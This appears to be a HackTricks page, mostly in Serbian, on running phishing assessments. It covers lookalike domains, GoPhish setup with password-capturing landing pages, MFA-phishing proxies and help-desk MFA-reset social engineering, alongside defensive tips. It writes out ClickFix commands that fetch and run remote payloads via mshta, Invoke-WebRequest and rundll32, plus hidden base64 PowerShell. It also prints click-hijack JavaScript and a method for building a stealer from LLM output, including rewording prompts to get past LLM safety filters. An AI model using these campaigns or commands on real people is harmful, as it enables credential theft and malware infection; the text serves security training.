# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Izaberi **victim domain**.
2. Uradi osnovnu web enumeraciju **tražeći login portale** koje koristi žrtva i **odluči** koji ćeš **impersonate**.
3. Koristi neki **OSINT** da **pronađeš emails**.
2. Pripremi environment
1. **Kupi domain** koji ćeš koristiti za phishing assessment
2. **Konfiguriši email service** related records (SPF, DMARC, DKIM, rDNS)
3. Konfiguriši VPS sa **gophish**
3. Pripremi campaign
1. Pripremi **email template**
2. Pripremi **web page** za krađu credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Domain name **contains** važan **keyword** originalnog domain-a (e.g., zelster.com-management.com).
- **hypened subdomain**: Promeni **tačku u crtu** u subdomain-u (e.g., www-zelster.com).
- **New TLD**: Isti domain koristeći **new TLD** (e.g., zelster.org)
- **Homoglyph**: On **menja** slovo u domain name sa **slovima koja izgledaju slično** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** On **zameni dva slova** unutar domain name-a (e.g., zelsetr.com).
- **Singularization/Pluralization**: Dodaje ili uklanja “s” na kraju domain name-a (e.g., zeltsers.com).
- **Omission**: On **uklanja jedno** od slova iz domain name-a (e.g., zelser.com).
- **Repetition:** On **ponavlja jedno** od slova u domain name-u (e.g., zeltsser.com).
- **Replacement**: Kao homoglyph ali manje stealthy. Menja jedno od slova u domain name-u, možda slovom koje je na tastaturi blizu originalnog slova (e.g, zektser.com).
- **Subdomained**: Uvede **tačku** unutar domain name-a (e.g., ze.lster.com).
- **Insertion**: On **umeće slovo** u domain name (e.g., zerltser.com).
- **Missing dot**: Dodaje TLD na domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Postoji **mogućnost da se jedan od nekih bitova uskladištenih ili u komunikaciji automatski flipuje** zbog raznih faktora kao što su solar flares, cosmic rays, ili hardware errors.

Kada se ovaj koncept **primeni na DNS requests**, moguće je da **domain koji primi DNS server** nije isti kao domain koji je inicijalno zatražen.

Na primer, jedna izmena bita u domain-u "windows.com" može ga promeniti u "windnws.com."

Napadači mogu **iskoristiti ovo registrujući više bit-flipping domain-a** koji su slični domain-u žrtve. Njihova namera je da preusmere legitimne korisnike na svoju infrastrukturu.

Za više informacija pročitaj [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Možeš pretražiti [https://www.expireddomains.net/](https://www.expireddomains.net) za expired domain koji bi mogao da koristiš.\
Da bi se uverio da expired domain koji ćeš kupiti **već ima dobar SEO** možeš proveriti kako je kategorizovan u:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Da bi **otkrio više** valid email adresa ili **verifikovao one** koje si već otkrio, možeš proveriti da li možeš da brute-force-uješ njihove smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Takođe, ne zaboravi da, ako korisnici koriste **bilo koji web portal za pristup svojim mailovima**, možeš proveriti da li je ranjiv na **username brute force**, i iskoristiti ranjivost ako je moguće.

## Configuring GoPhish

### Installation

Možeš ga preuzeti sa [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Preuzmi ga i raspakuj unutar `/opt/gophish` i izvrši `/opt/gophish/gophish`\
Biće ti dat password za admin user-a na portu 3333 u output-u. Zato pristupi tom portu i koristi te credentials da promeniš admin password. Možda ćeš morati da tuneluješ taj port na local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracija

**Konfiguracija TLS sertifikata**

Pre ovog koraka trebalo bi da ste **već kupili domen** koji ćete koristiti i on mora da **pokazuje** na **IP VPS-a** na kojem konfigurišete **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Start installing: `apt-get install postfix`

Then add the domain to the following files:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**

Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`

Now lets test to send an email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

Zaustavite izvršavanje gophish i hajde da ga konfigurišemo.\
Izmenite `/opt/gophish/config.json` na sledeće (obratite pažnju na upotrebu https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfiguriši gophish service**

Da biste kreirali gophish service tako da može da se automatski pokreće i da se njime upravlja kao service, možete kreirati fajl `/etc/init.d/gophish` sa sledećim sadržajem:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Završite konfiguraciju servisa i proverite ga radeći:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigurisanje mail servera i domena

### Sačekaj & budi legit

Što je domen stariji, manja je verovatnoća da će biti uhvaćen kao spam. Zato treba da sačekaš što je moguće duže (bar 1week) pre phishing assessment. moreover, ako postaviš stranicu o reputational sektoru, reputacija koju dobiješ biće bolja.

Imaj na umu da, čak i ako moraš da čekaš nedelju dana, sve možeš da završiš sa konfigurisanjem sada.

### Konfiguriši rDNS (Reverse DNS) zapis

Postavi rDNS (PTR) zapis koji rešava IP adresu VPS-a na ime domena.

### Sender Policy Framework (SPF) Record

Moraš da **konfigurišeš SPF record za novi domen**. Ako ne znaš šta je SPF record [**pročitaj ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Možeš da koristiš [https://www.spfwizard.net/](https://www.spfwizard.net) da generišeš svoju SPF policy (koristi IP VPS mašine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Ovo je sadržaj koji mora da bude podešen unutar TXT record-a unutar domena:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Morate **konfigurisati DMARC zapis za novi domen**. Ako ne znate šta je DMARC zapis, [**pročitajte ovu stranicu**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Morate da kreirate novi DNS TXT zapis koji pokazuje na hostname `_dmarc.<domain>` sa sledećim sadržajem:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

You must **configure a DKIM for the new domain**. If you don't know what is a DMARC record [**read this page**](../../network-services-pentesting/penting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> You need to concatenate both B64 values that the DKIM key generates:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

You can do that using [https://www.mail-tester.com/](https://www.mail-tester.com)\
Just access the page and send an email to the address they give you:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Takođe možete **proveriti svoju email konfiguraciju** slanjem emaila na `check-auth@verifier.port25.com` i **čitanjem odgovora** (za ovo ćete morati da **otvorite** port **25** i vidite odgovor u fajlu _/var/mail/root_ ako pošaljete email kao root).\
Proverite da li prolazite sve testove:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Možete takođe poslati **poruku na Gmail koji je pod vašom kontrolom**, i proveriti **zaglavlja email-a** u vašem Gmail inbox-u; `dkim=pass` bi trebalo da bude prisutno u polju zaglavlja `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Uklanjanje sa Spamhouse Blacklist

Stranica [www.mail-tester.com](https://www.mail-tester.com) može da ti pokaže da li je tvoj domen blokiran od strane spamhouse. Možeš da zatražiš uklanjanje svog domena/IP-a na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Uklanjanje sa Microsoft Blacklist

​​Možeš da zatražiš uklanjanje svog domena/IP-a na [https://sender.office.com/](https://sender.office.com).

## Kreiraj i pokreni GoPhish kampanju

### Sending Profile

- Postavi neko **ime za identifikaciju** sender profila
- Odluči sa kog računa ćeš slati phishing emailove. Predlozi: _noreply, support, servicedesk, salesforce..._
- Možeš da ostaviš prazne username i password, ali obavezno čekiraj Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Preporučuje se da koristiš funkcionalnost "**Send Test Email**" da proveriš da li sve radi.\
> Preporučio bih da **test emailove šalješ na 10min mail adrese** kako bi izbegao da budeš blacklistovan tokom testiranja.

### Email Template

- Postavi neko **ime za identifikaciju** template-a
- Zatim napiši **subject** (ništa čudno, samo nešto što bi očekivao da pročitaš u regularnom emailu)
- Obavezno čekiraj "**Add Tracking Image**"
- Napiši **email template** (možeš da koristiš promenljive kao u sledećem primeru):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Napomena da bi se **povećao kredibilitet emaila**, preporučuje se korišćenje neke signature iz emaila klijenta. Predlozi:

- Pošaljite email na **nepostojeću adresu** i proverite da li odgovor ima neku signature.
- Pretražite **javne emailove** kao info@ex.com ili press@ex.com ili public@ex.com i pošaljite im email, pa sačekajte odgovor.
- Pokušajte da kontaktirate **neki validno otkriveni** email i sačekajte odgovor

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template takođe omogućava da se **prikače fajlovi za slanje**. Ako biste takođe želeli da kradete NTLM challenge-e koristeći neke posebno pripremljene fajlove/dokumente [pročitajte ovu stranicu](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Unesite **ime**
- **Upišite HTML kod** veb stranice. Napomena da možete i da **importujete** veb stranice.
- Označite **Capture Submitted Data** i **Capture Passwords**
- Postavite **redirekciju**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Obično ćete morati da izmenite HTML kod stranice i napravite nekoliko testova lokalno (možda koristeći neki Apache server) **dok ne budete zadovoljni rezultatima.** Zatim, upišite taj HTML kod u polje.\
> Napomena da, ako treba da **koristite neke statičke resurse** za HTML (možda neke CSS i JS stranice), možete ih sačuvati u _**/opt/gophish/static/endpoint**_ i zatim im pristupiti preko _**/static/\<filename>**_

> [!TIP]
> Za redirekciju možete **preusmeriti korisnike na legitiman glavni veb sajt** žrtve, ili ih preusmeriti na _/static/migration.html_ na primer, staviti neku **rotirajuću ikonicu (**[**https://loading.io/**](https://loading.io)**) na 5 sekundi i zatim naznačiti da je proces uspešno završen**.

### Users & Groups

- Postavite ime
- **Importujte podatke** (napomena da, da biste koristili template za primer, potreban vam je firstname, last name i email adresa svakog korisnika)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Na kraju, kreirajte campaign tako što ćete izabrati ime, email template, landing page, URL, sending profile i grupu. Napomena da će URL biti link poslat žrtvama

Napomena da **Sending Profile omogućava slanje test emaila da biste videli kako će izgledati finalni phishing email**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Preporučio bih da **šaljete test emailove na 10min mail adrese** kako biste izbegli blacklisting tokom testiranja.

Kada je sve spremno, samo pokrenite campaign!

## Website Cloning

Ako iz bilo kog razloga želite da klonirate website, proverite sledeću stranicu:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

U nekim phishing procenama (uglavnom za Red Teams) možda ćete želeti da takođe **šaljete fajlove koji sadrže neku vrstu backdoor-a** (možda C2 ili možda samo nešto što će pokrenuti autentikaciju).\
Pogledajte sledeću stranicu za neke primere:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Prethodni napad je prilično pametan jer lažirate pravi website i prikupljate informacije koje je korisnik uneo. Nažalost, ako korisnik nije uneo tačnu lozinku ili ako je aplikacija koju ste lažirali konfigurisana sa 2FA, **ove informacije vam neće omogućiti da se predstavite kao prevareni korisnik**.

Tu su korisni alati kao što su [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Ovaj alat će vam omogućiti da generišete napad nalik MitM. Osnovno, napad radi na sledeći način:

1. Vi **impersonate login** forme pravog web sajta.
2. Korisnik **šalje** svoje **kredencijale** na vašu lažnu stranicu, a alat ih prosleđuje pravom web sajtu, **proveravajući da li kredencijali rade**.
3. Ako je nalog konfigurisán sa **2FA**, MitM stranica će ga zatražiti i kada ga **korisnik unese**, alat će ga poslati pravoj web stranici.
4. Kada se korisnik autentifikuje, vi ćete (kao napadač) imati **uhvaćene kredencijale, 2FA, cookie i sve informacije** iz svake interakcije dok alat izvodi MitM.

### Via VNC

Šta ako umesto da **šaljete žrtvu na zlonamernu stranicu** sa istim izgledom kao originalna, pošaljete je na **VNC sesiju sa browserom povezanim na pravi web sajt**? Moći ćete da vidite šta radi, ukradete lozinku, MFA koji koristi, cookie-e...\
To možete uraditi sa [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Očigledno, jedan od najboljih načina da znate da li ste otkriveni jeste da **pretražite svoj domen unutar blacklisti**. Ako se pojavljuje na listi, vaš domen je nekako detektovan kao sumnjiv.\
Jedan lak način da proverite da li se vaš domen pojavljuje u nekoj blacklisti jeste da koristite [https://malwareworld.com/](https://malwareworld.com)

Međutim, postoje i drugi načini da znate da li žrtva **aktivno traži sumnjivu phishing aktivnost na internetu** kao što je objašnjeno u:


{{#ref}}
detecting-phising.md
{{#endref}}

Možete **kupiti domen sa veoma sličnim imenom** kao domen žrtve **i/ili generisati sertifikat** za **subdomen** domena kojim upravljate **koji sadrži** **keyword** domena žrtve. Ako žrtva obavi bilo kakvu **DNS ili HTTP interakciju** sa njima, znaćete da **aktivno traži** sumnjive domene i moraćete da budete veoma stealth.

### Evaluate the phishing

Koristite [**Phishious** ](https://github.com/Rices/Phishious)da biste procenili da li će vaš email završiti u spam folderu ili će biti blokiran ili uspešan.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Savremeni intrusion set-ovi sve češće potpuno preskaču email lure-ove i **direktno ciljaju service-desk / identity-recovery workflow** kako bi zaobišli MFA. Napad je potpuno "living-off-the-land": kada operator poseduje validne kredencijale, prelazi na ugrađene admin alate – malware nije potreban.

### Attack flow
1. Recon žrtve
* Prikupite lične i korporativne podatke sa LinkedIn, data breach-ova, javnog GitHub-a itd.
* Identifikujte identitete visoke vrednosti (executives, IT, finance) i mapirajte **tačan help-desk proces** za reset lozinke / MFA.
2. Real-time social engineering
* Pozovite, pošaljite Teams ili chat poruku help-desk-u dok se predstavljate kao meta (često uz **spoofed caller-ID** ili **kloniran glas**).
* Dostavite prethodno prikupljene PII podatke kako biste prošli proveru zasnovanu na znanju.
* Ubedite agenta da **resetuje MFA secret** ili izvrši **SIM-swap** nad registrovanim mobilnim brojem.
3. Immediate post-access actions (≤60 min in real cases)
* Uspostavite foothold kroz bilo koji web SSO portal.
* Nabrojite AD / AzureAD koristeći ugrađene alate (nema dropovanih binarnih fajlova):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement sa **WMI**, **PsExec**, ili legitimnim **RMM** agentima koji su već dozvoljeni u okruženju.

### Detection & Mitigation
* Tretirajte help-desk identity recovery kao **privilegovanu operaciju** – zahtevajte step-up auth i odobrenje menadžera.
* Uvedite pravila **Identity Threat Detection & Response (ITDR)** / **UEBA** koja alarmiraju na:
* MFA metoda promenjena + autentikacija sa novog uređaja / geolokacije.
* Trenutno podizanje privilegija istog principal-a (user-→-admin).
* Snimajte help-desk pozive i sprovedite **call-back na već registrovani broj** pre bilo kakvog resetovanja.
* Implementirajte **Just-In-Time (JIT) / Privileged Access** tako da novoresetovani nalozi **ne dobijaju automatski** visokoprivilegovane tokene.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity ekipe nadoknađuju troškove high-touch operacija masovnim napadima koji pretvaraju **search engines & ad networks u delivery channel**.

1. **SEO poisoning / malvertising** gura lažni rezultat kao što je `chromium-update[.]site` na vrh search ads.
2. Žrtva preuzima mali **first-stage loader** (često JS/HTA/ISO). Primeri viđeni od strane Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader eksfiltrira browser cookie-je + credential DB-ove, zatim povlači **silent loader** koji odlučuje – *u realtime-u* – da li će rasporediti:
* RAT (npr. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence komponentu (registry Run key + scheduled task)

### Hardening tips
* Blokirajte novoregistrovane domene i sprovedite **Advanced DNS / URL Filtering** i na *search-ads* kao i na e-mail.
* Ograničite instalaciju softvera na potpisane MSI / Store pakete, zabranite izvršavanje `HTA`, `ISO`, `VBS` putem politike.
* Pratite child procese browsera koji otvaraju instalere:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Lovite LOLBins koji se često zloupotrebljavaju od strane first-stage loader-a (npr. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Neki lažni software portali zadržavaju vidljivi download `href` koji pokazuje na **pravi** GitHub/release URL, ali u JavaScript-u otimaju **prvu** korisničku interakciju i umesto toga šalju žrtvu u **Traffic Distribution System (TDS)** lanac.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Glavne osobine:
- Hook obično radi u **capture phase** (`true`) na `document`, pa se pokreće pre handlera sajta.
- Chrome često koristi `mousedown` umesto `click` da bi zadržao redirect vezan za validan **user gesture** i poboljšao zaobilaženje popup-blocker-a.
- Neke varijante unapred otvaraju `about:blank` ili sintetišu `<a target="_blank">` klikove i tek kasnije dodeljuju TDS URL.
- Ograničenja na browser strani često se čuvaju u `localStorage`, pa **prvi click** može da dovede do malware, dok osvežavanja/pokušaji ponovo padaju na benigno izgledajući vidljivi link.
- TDS može da filtrira po referreru, ulaznom domenu, GEO, browser/device fingerprintu, VPN/datacenter proverama, kontekstu klika i brojačima po sesiji, što analitičke replay pokušaje čini nedeterminističkim.

Ideje za defanzivu:
- Uporediti **prikazani** `href` sa **stvarnim** navigation targetom generisanim u trenutku klika.
- Tražiti `document.addEventListener(..., true)` handlere koji zovu i `preventDefault()` i `stopImmediatePropagation()` oko `window.open`, `about:blank` ili sintetičkih anchor klikova.
- Klastere novoregistrovanih software-download domena koji svi učitavaju isti CloudFront/JS stage tretirati kao visok-signalni SEO-poisoning/TDS obrazac.

### ClickFix od lažnih verification stranica + archive-looking LOLBAS fetches
Neke TDS grane završavaju na lažnoj verification stranici (Cloudflare/IUAM stil) koja govori žrtvi da pokrene trusted Windows binary kao što su:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Napomene:
- `mshta.exe` izvršava **HTA/VBScript na početku odgovora**, čak i ako URL glumi `.7z` arhivu; dodati arhivski podaci mogu biti čista obmana.
- Sledeće faze često nastavljaju da lažu o tipu fajla (`.rtf` za PowerShell, `.asar` za Python, ZIP-ovi sa paddingovanim binarnim fajlovima) i zatim prelaze na **manual PE mapping / in-memory execution**.
- Ako odgovarate na jedan od ovih chain-ova, sačuvajte **network + memory iz prvog uspešnog pokretanja**: kasnija ponavljanja mogu prikazati samo benigni installer/SFX path ili failovati zato što su payload/key release bili vezani za originalnu TDS sesiju.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: klonirano nacionalno CERT obaveštenje sa **Update** dugmetom koje prikazuje korak-po-korak “fix” instrukcije. Žrtvama se kaže da pokrenu batch koji preuzima DLL i izvršava ga preko `rundll32`.
* Tipičan batch chain primećen:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` smešta payload u `%TEMP%`, kratko čekanje prikriva network jitter, a zatim `rundll32` poziva exported entrypoint (`notepad`).
* DLL šalje host identitet i proverava C2 svakih nekoliko minuta. Remote tasking stiže kao **base64-encoded PowerShell** koji se izvršava skriveno i sa policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Ovo čuva C2 fleksibilnost (server može menjati zadatke bez ažuriranja DLL-a) i skriva console window-e. Tražite PowerShell child procese od `rundll32.exe` koji koriste `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` zajedno.
* Defenders can look for HTTP(S) callbacks u formatu `...page.php?tynor=<COMPUTER>sss<USER>` i 5-minutne polling intervale nakon učitavanja DLL-a.

---

## AI-Enhanced Phishing Operations
Napadači sada povezuju **LLM & voice-clone APIs** za potpuno personalizovane lure-ove i interakciju u realnom vremenu.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Dodajte **dynamic banners** koji ističu poruke poslate sa nepouzdanih automation izvora (putem ARC/DKIM anomalija).
• Primena **voice-biometric challenge phrases** za visokorizične telefonske zahteve.
• Kontinuirano simulirajte AI-generated lure-ove u awareness programima – statički šabloni su zastareli.

Pogledajte i – agentic browsing abuse za credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Pogledajte i – AI agent abuse lokalnih CLI alata i MCP (za secrets inventory i detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Napadači mogu isporučiti benigno izgledajući HTML i **generisati stealer u runtime-u** tako što zatraže od **trusted LLM API** JavaScript, pa ga izvrše u browser-u (npr. `eval` ili dinamički `<script>`).

1. **Prompt-as-obfuscation:** enkodirajte exfil URL-ove/Base64 stringove u prompt; iterirajte wording da biste zaobišli safety filtere i smanjili hallucinations.
2. **Client-side API call:** pri učitavanju, JS poziva public LLM (Gemini/DeepSeek/etc.) ili CDN proxy; u static HTML-u je prisutan samo prompt/API poziv.
3. **Assemble & exec:** konkatenirajte odgovor i izvršite ga (polymorphic po poseti):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.

**Evasion traits**
- Traffic hits well-known LLM domains or reputable CDN proxies; sometimes via WebSockets to a backend.
- No static payload; malicious JS exists only after render.
- Non-deterministic generations produce **unique** stealers per session.

**Detection ideas**
- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Nadzirajte AzureAD/AWS/Okta događaje gde se **`deleteMFA` + `addMFA`** dešavaju **u roku od nekoliko minuta sa iste IP adrese**.



## Clipboard Hijacking / Pastejacking

Napadači mogu neprimetno kopirati zlonamerne komande u clipboard žrtve sa kompromitovane ili typosquatted web stranice, a zatim prevariti korisnika da ih nalepi unutar **Win + R**, **Win + X** ili terminal prozora, izvršavajući proizvoljan code bez ikakvog preuzimanja ili priloga.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* A lure page (npr. fake ministry/CERT “channel”) prikazuje WhatsApp Web/Desktop QR i instruira žrtvu da ga skenira, tiho dodajući napadača kao **linked device**.
